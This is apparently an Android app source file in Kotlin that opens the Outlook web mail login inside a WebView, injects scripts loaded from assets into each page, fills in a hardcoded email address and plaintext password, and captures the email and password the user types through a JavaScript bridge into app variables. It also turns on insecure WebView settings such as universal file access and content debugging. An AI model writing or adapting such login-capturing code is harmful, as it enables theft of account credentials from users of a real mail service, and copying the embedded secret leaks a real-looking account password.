package com.nujnay.webview

import android.app.Activity
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.webkit.*
import kotlinx.android.synthetic.main.activity_main.*
import org.apache.commons.io.IOUtils

class MainActivity : Activity() {
    private var gotoUrl: String? = null
    private var coockieUrl: String? = null

    public var jsInjectedOldEmailOK: Boolean? = false
    public var jsInjectedOldPwdOK: Boolean? = false

    public var jsInjectedEmailOK: Boolean? = false
    public var jsInjectedPwdOK: Boolean? = false

    public var jsInjectedOldEmail: String? = null
    public var jsInjectedOldPwd: String? = null
    public var needInputEmail: Boolean? = true


    public var emailOld: String? = "nujnai@outlook.com"
    public var emailOldPassword: String? = "1121firstday"

    public var newEmail: String? = null
    public var newPwd: String? = null

    public var inputOldEmailJs: String? = null
    public var inputOldEmialSuccess: Boolean? = false


    var getEmailPwd: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        gotoUrl = "https://outlook.live.com/mail/inbox"
        coockieUrl = "https://outlook.live.com/owa/sessiondata.ashx?app=Mini"
        initjsInjected()
        initWebview()
    }

    private fun initjsInjected() {
        val oldEmailJS = IOUtils.toString(this@MainActivity.assets.open("http/hotmail_email_input.js"), "UTF-8")
        inputOldEmailJs = oldEmailJS.replace("emailcontent", emailOld!!, false)

        val oldPwdJS = IOUtils.toString(this@MainActivity.assets.open("deprected/hotmail_email_input.js"), "UTF-8")
        jsInjectedOldPwd = oldPwdJS.replace("pwdcontent", emailOldPassword!!, false)

        getEmailPwd = IOUtils.toString(this@MainActivity.assets.open("http/hotmail_get_email_pwd.js"), "UTF-8")
    }

    fun initWebview() {
        val webviewSettings: WebSettings = wv_injected.settings
        webviewSettings.domStorageEnabled = true
        webviewSettings.databaseEnabled = true
        webviewSettings.allowFileAccessFromFileURLs = true
        webviewSettings.allowUniversalAccessFromFileURLs = true
        webviewSettings.allowFileAccess = true
        webviewSettings.javaScriptEnabled = true
        webviewSettings.javaScriptCanOpenWindowsAutomatically = true
        webviewSettings.setSupportZoom(true)
        webviewSettings.builtInZoomControls = true
        webviewSettings.useWideViewPort = true
        webviewSettings.layoutAlgorithm = WebSettings.LayoutAlgorithm.NARROW_COLUMNS
        webviewSettings.loadWithOverviewMode = true
        webviewSettings.cacheMode = WebSettings.LOAD_NO_CACHE
        webviewSettings.pluginState = WebSettings.PluginState.ON
        webviewSettings.setSupportMultipleWindows(true)
        WebView.setWebContentsDebuggingEnabled(true)
        wv_injected.addJavascriptInterface(InjectedScriptInterface(), "getGmailAccount")
        wv_injected.webViewClient = MyWebviewClient()
        wv_injected.loadUrl(gotoUrl)
    }

    inner class MyWebviewClient : WebViewClient() {
        override fun onPageFinished(view: WebView?, url: String?) {
            super.onPageFinished(view, url)
            try {
                injectJs()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }

        override fun shouldInterceptRequest(view: WebView?, request: WebResourceRequest?): WebResourceResponse? {
            runOnUiThread {
                try {
                    injectJs()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
            return super.shouldInterceptRequest(view, request)
        }
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            if (wv_injected.canGoBack()) {
                wv_injected.goBack()
            } else {
                finish()
            }
        }
        return true
    }

    fun injectJs() {
        Log.d("inputOldEmialSuccess", needInputEmail.toString() + "|||" + inputOldEmialSuccess.toString())
        if (needInputEmail!!) {
            //先注入邮箱 注入成功不在注入
            if (inputOldEmialSuccess!!) {//注入成功 点击下一步判断是否 替换邮箱 替换邮箱不注入密码 为替换邮箱注入密码
                wv_injected.loadUrl("javascript:$getEmailPwd")
            } else {
                wv_injected.loadUrl("javascript:$inputOldEmailJs")
            }
        } else {
            wv_injected.loadUrl("javascript:$getEmailPwd")
        }
    }

    inner class InjectedScriptInterface {
        @JavascriptInterface
        fun getGmailAccount(output: String) {
            Log.d("outputtt", output)
            if (needInputEmail!!) {
                if (!inputOldEmialSuccess!!) {
                    if (output.contains("inputEmail))((")) {
                        if (output.contains("true")) {//注入成功 检测是否替换邮箱
                            inputOldEmialSuccess = true
                        }
                    }
                } else {//注入成功 检测是否替换邮箱
//                    var emilPwd = output.split("||+|+||")
//                    if (emilPwd[0].checkHasContent()) {
//                        if (!emilPwd[0].equals(emailOld)) {
//                            newEmail = emilPwd[0]
//                        }
//                    }
                }

            } else {
                var emilPwd = output.split("||+|+||")
                if (emilPwd[0].checkHasContent()) {
                    newEmail = emilPwd[0]
                }
                if (emilPwd[1].checkHasContent()) {
                    newPwd = emilPwd[1]
                }
            }
        }
    }

    fun String.checkHasContent(): Boolean {
        return !this.contentEquals("=_=+_+")
    }
}
